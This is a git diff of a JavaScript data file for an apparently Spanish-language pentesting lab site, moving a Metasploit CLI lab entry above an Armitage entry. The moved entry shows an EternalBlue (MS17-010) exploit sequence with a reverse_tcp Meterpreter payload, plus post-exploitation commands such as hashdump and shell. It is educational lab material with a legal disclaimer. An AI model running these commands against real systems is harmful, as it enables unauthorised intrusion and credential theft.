@@ -1,4 +1,83 @@
 export const labsData = [  {
+    slug: "metasploit",
+    title: "Explotación de Vulnerabilidades en Windows con Metasploit",
+    description: "Ejecución detallada de exploits y payloads utilizando la interfaz de línea de comandos (CLI) de Metasploit Framework para pentesting profesional.",
+    date: "Domingo, 6 de abril de 2025",
+    badges: ["Post-Explotación", "Escalamiento de Privilegios", "Análisis de Vulnerabilidades", "CLI", "Windows"],
+    details: `<div class="space-y-6">
+      <div class="bg-card rounded-lg p-6 mb-8 shadow-lg">
+        <h2 class="text-2xl font-semibold mb-4">Objetivo Principal</h2>
+        <p class="text-muted-foreground">
+          Demostrar el proceso de identificación y explotación de vulnerabilidades en un sistema Windows utilizando 
+          la interfaz de línea de comandos (CLI) del Metasploit Framework. Este laboratorio tiene fines educativos 
+          para comprender en profundidad el funcionamiento de Metasploit y la metodología de pentesting.
+        </p>
+      </div>
+
+      <div class="mb-8">
+        <h3 class="text-xl font-semibold mb-4">Inicio Rápido</h3>
+        <div class="bg-muted p-4 rounded-md overflow-x-auto mb-4">
+          <pre>sudo systemctl start postgresql
+sudo msfdb init
+msfconsole</pre>
+        </div>
+      </div>
+
+      <div class="mb-8">
+        <h3 class="text-xl font-semibold mb-4">Comandos Fundamentales</h3>
+        <ul class="list-disc pl-6 space-y-2">
+          <li>🔍 <code>db_nmap -sV &lt;IP&gt;</code> - Escaneo de servicios</li>
+          <li>🔎 <code>search &lt;término&gt;</code> - Búsqueda de exploits</li>
+          <li>📌 <code>use &lt;exploit&gt;</code> - Selección de exploit</li>
+          <li>⚙️ <code>set RHOST/LHOST</code> - Configuración de parámetros</li>
+          <li>🎯 <code>exploit</code> - Ejecución del exploit</li>
+          <li>💻 <code>sessions -i &lt;ID&gt;</code> - Gestión de sesiones</li>
+        </ul>
+      </div>
+
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
+        <div>
+          <h3 class="text-xl font-semibold mb-4">Comandos de Meterpreter</h3>
+          <div class="bg-muted p-4 rounded-md overflow-x-auto">
+            <pre>sysinfo      # Info del sistema
+getuid       # Usuario actual
+ps           # Listar procesos
+hashdump     # Extraer hashes
+migrate      # Migrar proceso
+shell        # Obtener shell</pre>
+          </div>
+        </div>
+        <div>
+          <h3 class="text-xl font-semibold mb-4">Ejemplo de Explotación</h3>
+          <div class="bg-muted p-4 rounded-md overflow-x-auto">
+            <pre>use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+set LHOST 192.168.1.50
+set payload windows/x64/meterpreter/reverse_tcp
+exploit</pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="bg-destructive/10 p-6 rounded-lg mt-8">
+        <h4 class="text-lg font-semibold mb-2 text-destructive">⚠️ Aviso Legal Importante</h4>
+        <p class="text-muted-foreground">
+          Este laboratorio debe realizarse únicamente en un entorno controlado y con permiso explícito.
+          La explotación no autorizada de sistemas puede tener graves consecuencias legales. El objetivo
+          es puramente educativo para comprender el funcionamiento interno de Metasploit y mejorar las
+          defensas de los sistemas.
+        </p>
+      </div>
+    </div>`,
+    images: [
+      "/lab1/metasploit/1.png"
+    ],
+    links: [
+      { label: "Documentación de Metasploit", url: "https://docs.metasploit.com/" },
+      { label: "Metasploit Framework Github", url: "https://github.com/rapid7/metasploit-framework" }
+    ]
+  },
+  {
     slug: "armitage",
     title: "Explotación de Vulnerabilidades en Windows con Armitage",
     description: "Explotación gráfica de vulnerabilidades y gestión visual de sesiones con Metasploit. Demostración del proceso completo de pentesting desde el escaneo hasta la post-explotación.",
@@ -80,84 +159,6 @@ sudo armitage</pre>
     links: [
       { label: "Documentación de Armitage", url: "http://www.fastandeasyhacking.com/" },
       { label: "Metasploit Framework", url: "https://github.com/rapid7/metasploit-framework" }
-    ]
-  },  {
-    slug: "metasploit",
-    title: "Explotación de Vulnerabilidades en Windows con Metasploit Framework (CLI)",
-    description: "Ejecución detallada de exploits y payloads utilizando la interfaz de línea de comandos (CLI) de Metasploit Framework para pentesting profesional.",
-    date: "Domingo, 6 de abril de 2025",
-    badges: ["Post-Explotación", "Escalamiento de Privilegios", "Análisis de Vulnerabilidades", "CLI", "Windows"],
-    details: `<div class="space-y-6">
-      <div class="bg-card rounded-lg p-6 mb-8 shadow-lg">
-        <h2 class="text-2xl font-semibold mb-4">Objetivo Principal</h2>
-        <p class="text-muted-foreground">
-          Demostrar el proceso de identificación y explotación de vulnerabilidades en un sistema Windows utilizando 
-          la interfaz de línea de comandos (CLI) del Metasploit Framework. Este laboratorio tiene fines educativos 
-          para comprender en profundidad el funcionamiento de Metasploit y la metodología de pentesting.
-        </p>
-      </div>
-
-      <div class="mb-8">
-        <h3 class="text-xl font-semibold mb-4">Inicio Rápido</h3>
-        <div class="bg-muted p-4 rounded-md overflow-x-auto mb-4">
-          <pre>sudo systemctl start postgresql
-sudo msfdb init
-msfconsole</pre>
-        </div>
-      </div>
-
-      <div class="mb-8">
-        <h3 class="text-xl font-semibold mb-4">Comandos Fundamentales</h3>
-        <ul class="list-disc pl-6 space-y-2">
-          <li>🔍 <code>db_nmap -sV &lt;IP&gt;</code> - Escaneo de servicios</li>
-          <li>🔎 <code>search &lt;término&gt;</code> - Búsqueda de exploits</li>
-          <li>📌 <code>use &lt;exploit&gt;</code> - Selección de exploit</li>
-          <li>⚙️ <code>set RHOST/LHOST</code> - Configuración de parámetros</li>
-          <li>🎯 <code>exploit</code> - Ejecución del exploit</li>
-          <li>💻 <code>sessions -i &lt;ID&gt;</code> - Gestión de sesiones</li>
-        </ul>
-      </div>
-
-      <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
-        <div>
-          <h3 class="text-xl font-semibold mb-4">Comandos de Meterpreter</h3>
-          <div class="bg-muted p-4 rounded-md overflow-x-auto">
-            <pre>sysinfo      # Info del sistema
-getuid       # Usuario actual
-ps           # Listar procesos
-hashdump     # Extraer hashes
-migrate      # Migrar proceso
-shell        # Obtener shell</pre>
-          </div>
-        </div>
-        <div>
-          <h3 class="text-xl font-semibold mb-4">Ejemplo de Explotación</h3>
-          <div class="bg-muted p-4 rounded-md overflow-x-auto">
-            <pre>use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS 192.168.1.100
-set LHOST 192.168.1.50
-set payload windows/x64/meterpreter/reverse_tcp
-exploit</pre>
-          </div>
-        </div>
-      </div>
-
-      <div class="bg-destructive/10 p-6 rounded-lg mt-8">
-        <h4 class="text-lg font-semibold mb-2 text-destructive">⚠️ Aviso Legal Importante</h4>
-        <p class="text-muted-foreground">
-          Este laboratorio debe realizarse únicamente en un entorno controlado y con permiso explícito.
-          La explotación no autorizada de sistemas puede tener graves consecuencias legales. El objetivo
-          es puramente educativo para comprender el funcionamiento interno de Metasploit y mejorar las
-          defensas de los sistemas.
-        </p>
-      </div>
-    </div>`,
-    images: [
-      "/lab1/metasploit/1.png"
-    ],
-    links: [
-      { label: "Documentación de Metasploit", url: "https://docs.metasploit.com/" },
-      { label: "Metasploit Framework Github", url: "https://github.com/rapid7/metasploit-framework" }
     ]
   },
   {    slug: "airgeddon",
